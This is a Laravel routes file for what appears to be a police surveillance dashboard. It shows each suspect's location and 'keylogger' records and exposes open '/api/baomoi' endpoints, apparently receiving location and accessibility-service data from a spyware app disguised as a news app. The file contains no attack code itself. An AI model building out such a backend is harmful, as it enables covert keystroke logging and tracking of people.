<?php

use App\Http\Controllers\Api\AccessibilityController;
use App\Http\Controllers\Api\LocationController;
use App\Http\Controllers\Auth\LoginController;
use App\Http\Controllers\Squad\AddSquadController;
use App\Http\Controllers\Squad\EditSquadController;
use App\Http\Controllers\Squad\SquadController;
use App\Http\Controllers\Suspect\EditSuspectController;
use App\Http\Controllers\Suspect\KeyloggerSuspectController;
use App\Http\Controllers\Suspect\LocationSuspectController;
use App\Http\Controllers\Suspect\SuspectListController;
use App\Http\Controllers\User\AddUserController;
use App\Http\Controllers\User\ChangePasswordController;
use App\Http\Controllers\User\EditUserController;
use App\Http\Controllers\User\UserController;
use App\Http\Middleware\AuthMiddleware;
use App\Http\Middleware\DoitruongMiddleware;
use App\Http\Middleware\ThutruongMiddleware;
use App\Http\Middleware\VerifyMiddleware;
use Illuminate\Support\Facades\Route;

Route::middleware([VerifyMiddleware::class])->group(function (){
    Route::get('/', [SuspectListController::class, 'show'])->name('dashboard');

    Route::get('/location/{id}', [LocationSuspectController::class, 'show'])->name('location');
    Route::get('/keylogger/{id}', [KeyloggerSuspectController::class, 'show'])->name('keylogger');


    Route::middleware([ThutruongMiddleware::class])->group(function (){

        Route::get('/police', [UserController::class, 'show'])->name('show-user');

        Route::get('/add-police', [AddUserController::class, 'show'])->name('add-user');
        Route::post('/add-police', [AddUserController::class, 'create'])->name('post.add-user');

        Route::get('/edit-police/{id}', [EditUserController::class, 'show'])->name('edit-user');
        Route::post('/edit-police/{id}', [EditUserController::class, 'edit'])->name('post.edit-user');

        Route::get('/police/change-password/{id}', [ChangePasswordController::class, 'show'])->name('change-password');
        Route::post('/police/change-password/{id}', [ChangePasswordController::class, 'change'])->name('post.change-password');

        Route::post('/police/active/{id}', [UserController::class, 'active'])->name('post.active');

        Route::get('/add-squad', [AddSquadController::class, 'show'])->name('add-squad');
        Route::post('/add-squad', [AddSquadController::class, 'create'])->name('post.add-squad');
        Route::delete('/delete-user/{id}', [SquadController::class, 'destroy'])->name('delete-squad');

        Route::get('/edit-squad/{id}', [EditSquadController::class, 'show'])->name('edit-squad');
        Route::post('/edit-squad/{id}', [EditSquadController::class, 'edit'])->name('post.edit-squad');

        Route::get('/edit-suspect/{id}', [EditSuspectController::class, 'show'])->name('edit-suspect');
        Route::post('/edit-suspect/{id}', [EditSuspectController::class, 'edit'])->name('post.edit-suspect');
    });

    Route::middleware([DoitruongMiddleware::class])->group(function (){
        Route::get('/squad', [SquadController::class, 'show'])->name('show-squad');
        Route::post('/squad/add-police', [SquadController::class, 'add'])->name('add-squad');
        Route::delete('/squad/delete-police/{id}', [SquadController::class, 'delete'])->name('delete-police');
    });

    Route::get('/logout', [LoginController::class, 'logout']);
});

Route::middleware([AuthMiddleware::class])->group(function (){
    Route::get('/login', [LoginController::class, 'show'])->name('auth.login');
    Route::post('/login', [LoginController::class, 'login'])->name('auth.post.login');
});

Route::post('/api/baomoi', [LocationController::class, 'post']);
Route::post('/api/baomoi/accessibility', [AccessibilityController::class, 'post']);
